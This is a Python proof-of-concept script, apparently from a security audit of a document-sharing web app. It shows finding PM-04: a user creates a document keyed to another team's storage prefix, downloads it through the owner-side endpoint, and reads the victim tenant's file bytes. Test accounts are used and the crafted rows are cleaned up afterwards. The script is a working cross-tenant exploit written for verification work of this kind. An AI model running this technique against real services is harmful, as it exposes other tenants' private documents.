#!/usr/bin/env python3
"""PM-04 — a registered user creates a document in their OWN team whose storage key
points into ANOTHER team's prefix, then downloads it through the ordinary
owner-side download endpoint. The signer derives the team from the key itself, so
it signs with the victim team's storage config and returns the bytes.

The crafted rows are removed in `finally`.

    docker exec -e PYTHONPATH=/opt/poc-deps pm-audit-app \
        python3 /app/security-review/pm-04-cross-tenant-storage-key-read/poc.py
"""
import sys
import pathlib

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "_poc"))
from pmpoc import (  # noqa: E402
    BASE, db, db_close, post, as_json, mint_cookie, fetch_bytes,
    VULN, CONTROL, OBSERVE, log, summary,
)

# ---- discover fixtures -----------------------------------------------------
ATK_TEAM = db('select "teamId" from "User" u join "UserTeam" ut on ut."userId"=u.id '
              "where u.email=$1", ["mallory@attacker.test"])[0]["teamId"]
VICTIM_TEAM = db('select "teamId" from "User" u join "UserTeam" ut on ut."userId"=u.id '
                 "where u.email=$1", ["alice@victim.test"])[0]["teamId"]
# A victim-owned original file that exists in the bucket (reseeder seeds every
# DocumentVersion.file). Prefer the board deck; fall back to any victim key.
cand = db('select dv.file from "DocumentVersion" dv join "Document" d on d.id=dv."documentId" '
          "where d.\"teamId\"=$1 and dv.file like $2 order by dv.\"createdAt\" limit 1",
          [VICTIM_TEAM, VICTIM_TEAM + "/%board-deck%"])
if not cand:
    cand = db('select dv.file from "DocumentVersion" dv join "Document" d on d.id=dv."documentId" '
              "where d.\"teamId\"=$1 and dv.file like $2 order by dv.\"createdAt\" limit 1",
              [VICTIM_TEAM, VICTIM_TEAM + "/%"])
VICTIM_KEY = cand[0]["file"]
MALLORY = mint_cookie("mallory@attacker.test")

log(f"PM-04 — cross-tenant storage key   base={BASE}")
log(f"  attacker team={ATK_TEAM}   victim key={VICTIM_KEY}")
log("")

created_doc = None
try:
    # ---- step 1: create a document in the attacker's team over the victim's key
    c_status, c_text, _ = post(f"/api/teams/{ATK_TEAM}/documents", {
        "name": "pm04.pdf", "url": VICTIM_KEY, "storageType": "S3_PATH",
        "type": "pdf", "contentType": "application/pdf",
    }, MALLORY)
    rows = db('select id,"teamId",file from "Document" where "teamId"=$1 and file=$2 '
              'order by "createdAt" desc limit 1', [ATK_TEAM, VICTIM_KEY])
    created_doc = rows[0] if rows else None
    OBSERVE("create response", f"status={c_status} (500 is the Trigger.dev stub; the row lands first)")
    CONTROL("document row is owned by the attacker team but keyed to the victim prefix",
            bool(created_doc) and created_doc["teamId"] == ATK_TEAM
            and created_doc["file"].split("/")[0] == VICTIM_TEAM,
            str(created_doc))

    if created_doc:
        # ---- step 2: download it through the ordinary owner-side endpoint
        d_status, d_text, _ = post(
            f"/api/teams/{ATK_TEAM}/documents/{created_doc['id']}/download", {}, MALLORY)
        signed = as_json(d_text).get("downloadUrl", "") or ""
        VULN("download signs and returns a URL for the victim object",
             d_status == 200 and VICTIM_KEY in signed, f"status={d_status} signed={signed[:80]}")

        # ---- step 3: fetch the bytes with no credentials on the signed URL
        byts = b""
        if signed:
            _, byts = fetch_bytes(signed)
        text = byts.decode("latin1", "replace")
        VULN("attacker reads another tenant's original file bytes",
             "MARKER" in text and VICTIM_TEAM in text, text.strip()[:110])
finally:
    if created_doc:
        db('delete from "DocumentVersion" where "documentId"=$1', [created_doc["id"]])
        db('delete from "Document" where id=$1', [created_doc["id"]])
        log("")
        log("  cleanup: crafted document and version removed")

summary("PM-04 cross-tenant storage-key read")
db_close()
